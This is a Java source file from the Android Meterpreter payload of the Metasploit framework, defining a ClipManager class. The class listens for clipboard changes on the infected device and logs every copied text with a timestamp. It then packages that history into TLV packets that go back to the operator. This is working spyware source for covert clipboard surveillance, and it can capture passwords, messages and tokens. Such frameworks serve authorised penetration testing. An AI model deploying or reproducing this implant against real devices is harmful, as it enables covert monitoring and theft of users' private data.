package com.metasploit.meterpreter;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.text.format.DateFormat;

import java.io.IOException;
import java.util.Date;
import java.util.LinkedList;
import java.util.List;

public class ClipManager implements ClipboardManager.OnPrimaryClipChangedListener {

    private final Object waiter = new Object();

    private final Context context;
    private ClipboardManager clipboardManager;
    private final List<ClipEntry> clipboardHistory = new LinkedList<ClipEntry>();
    private class ClipEntry {
        long timestamp;
        String text;
    }

    private ClipManager(Context contextInput) {
        this.context = contextInput;
        // Switch to the UI thread to get the ClipboardManager
        final Handler handler = new Handler(Looper.getMainLooper());
        handler.post(new Runnable() {
            public void run() {
                synchronized (waiter) {
                    clipboardManager = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
                    waiter.notify();
                }
            }
        });
        synchronized (waiter) {
            try {
                if (clipboardManager == null) {
                    waiter.wait(100);
                }
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    public static ClipManager create(Context context) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.HONEYCOMB) {
            return null;
        }
        return new ClipManager(context);
    }


    public void setText(String text) {
        clipboardManager.setPrimaryClip(ClipData.newPlainText("", text));
    }

    public String getText() {
        if (!clipboardManager.hasPrimaryClip()) {
            return "(null - clipboard was cleared)";
        }

        ClipData primaryClip = clipboardManager.getPrimaryClip();
        ClipData.Item item = primaryClip.getItemAt(0);
        return item.coerceToText(context).toString();
    }

    public void stop() {
        clipboardManager.removePrimaryClipChangedListener(this);
    }

    public void start() {
        clipboardManager.addPrimaryClipChangedListener(this);
    }

    @Override
    public void onPrimaryClipChanged() {
        ClipEntry clipEntry = new ClipEntry();
        clipEntry.timestamp = System.currentTimeMillis();
        clipEntry.text = getText();
        clipboardHistory.add(clipEntry);
    }

    public void purge() {
        clipboardHistory.clear();
    }

    public void dump(TLVPacket response) throws IOException {
        for (ClipEntry clipText : clipboardHistory) {
            TLVPacket pckt = new TLVPacket();
            pckt.addOverflow(TLVType.TLV_TYPE_EXT_CLIPBOARD_TYPE_TIMESTAMP, new Date(clipText.timestamp).toString());
            pckt.addOverflow(TLVType.TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT_CONTENT, clipText.text);
            response.addOverflow(TLVType.TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT, pckt);
        }
    }
}
